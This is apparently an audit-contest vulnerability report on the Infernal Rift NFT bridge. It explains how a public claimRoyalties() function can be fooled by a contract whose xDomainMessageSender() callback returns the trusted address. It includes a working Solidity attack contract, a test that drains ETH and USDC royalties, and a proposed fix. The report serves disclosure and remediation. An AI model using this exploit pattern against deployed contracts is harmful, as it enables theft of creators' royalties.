# Malicious contract can claim all L2 royalties on any collection through InfernalRiftBelow

## Summary

Improper access control in InfernalRiftBelow's [`claimRoyalties()`](https://github.com/flayerlabs/moongate/blob/main/src/InfernalRiftBelow.sol#L220) function allows anyone using a malicious contract to claim all royalties accrued to any L2 collection.

## Root Cause

[`claimRoyalties()`](https://github.com/flayerlabs/moongate/blob/main/src/InfernalRiftBelow.sol#L220) is a `public` function. At [`InfernalRiftBelow.sol:220`](https://github.com/flayerlabs/moongate/blob/main/src/InfernalRiftBelow.sol#L220), this function checks if `msg.sender` is `INFERNAL_RIFT_ABOVE` using the `.xDomainMessageSender()` callback on `msg.sender` wrapped with the `ICrossDomainMessenger` interface. If `claimRoyalties()` is called from a contract with a function `xDomainMessageSender()` that returns the address of `INFERNAL_RIFT_ABOVE`, access control is completely bypassed.

## Internal pre-conditions

L2 collections bridged from L1 with Infernal Rift have accrued royalties.

## External pre-conditions

Collections have been bridged using Infernal Rift.

## Attack Path

### 1. The Malicious Contract
This contract will call `claimRoyalties()` as if from a user account. When [`ICrossDomainMessenger(msg.sender).xDomainMessageSender()`](https://github.com/flayerlabs/moongate/blob/main/src/InfernalRiftBelow.sol#L222) is called, the callback receiver will return `address(riftAbove)`, bypassing the access control check.

pragma solidity ^0.8.26;

interface IRiftBelow {
    function claimRoyalties(address _collectionAddress, address _recipient, address[] calldata _tokens) external;
}

contract AttackBelow {

    IRiftBelow riftBelow;
    address riftAbove;

    constructor(address _riftAbove, address _riftBelow) {
        riftBelow = IRiftBelow(_riftBelow);
        riftAbove = _riftAbove;
    }

    function attack(address collectionAddress, address attacker, address[] memory tokens) external {
        riftBelow.claimRoyalties(collectionAddress, attacker, tokens);
    }

    // Callback Receiver
    function xDomainMessageSender() external view returns (address) {
        return address(riftAbove);
    }

}
```

### 2. The Attack
Context is established according to the beginning of the `test_canClaimRoyalties()` test.

```solidity
function test_AttackBelow() public {
        // Set the royalty information for the L1 contract
        l1NFT.setDefaultRoyalty(address(this), 1000);

        // Create an ERC721 that implements ERC2981 for royalties
        _bridgeNft(address(this), address(l1NFT), 0);

        // Get our 'L2' address
        Test721 l2NFT = Test721(riftBelow.l2AddressForL1Collection(address(l1NFT), false));

        // Add some royalties (10 ETH and 1000 USDC) onto the L2 contract
        deal(address(l2NFT), 10 ether);
        deal(address(USDC), address(l2NFT), 1000 ether);

        // Set up our tokens array to try and claim native ETH
        address[] memory tokens = new address[](2);
        tokens[0] = address(0);
        tokens[1] = address(USDC);

        // BEGIN ATTACK
        vm.startPrank(BOB);

        // BOB is broke!
        assertEq(payable(BOB).balance, 0);
        assertEq(USDC.balanceOf(BOB), 0);

        // BOB tries to claim royalties on an arbitrary collection from his account, which reverts.
        vm.expectRevert();
        riftBelow.claimRoyalties(address(l1NFT), BOB, tokens);

        /* BOB writes a contract which calls claimRoyalties(), but contains the function xDomainMessageSender(),
        which will receive a callback and return address(riftAbove) */
        attackBelow = new AttackBelow(address(riftAbove), address(riftBelow));
        attackBelow.attack(address(l1NFT), BOB, tokens);

        vm.stopPrank();

        // No more royalties in l2NFT
        assertEq(payable(address(l2NFT)).balance, 0 ether);
        assertEq(USDC.balanceOf(address(l2NFT)), 0 ether);

        // BOB is no longer broke!
        assertEq(payable(BOB).balance, 10 ether);
        assertEq(USDC.balanceOf(BOB), 1000 ether);

        // claimRoyalties() can still be called on riftAbove in a legitimate context, but the money is gone.
        riftAbove.claimRoyalties(address(l1NFT), ALICE, tokens, 0);
        assertEq(payable(ALICE).balance, 0);
        assertEq(USDC.balanceOf(ALICE), 0);
        
    }
```

## Impact

Any royalties accrued to any L2 contract can be claimed by anyone using a malicious contract. A simple `for` loop with the right array of collection addresses could drain every single collection bridged with Infernal Rift in a single transaction.

## Mitigation

I was able to prevent this attack from succeeding by declaring `error SenderNotPortal()` at the beginning of the contract and adding
```solidity
if (msg.sender != RELAYER_ADDRESS) {
            revert SenderNotPortal();
        }
```
at the beginning of `claimRoyalties()`.
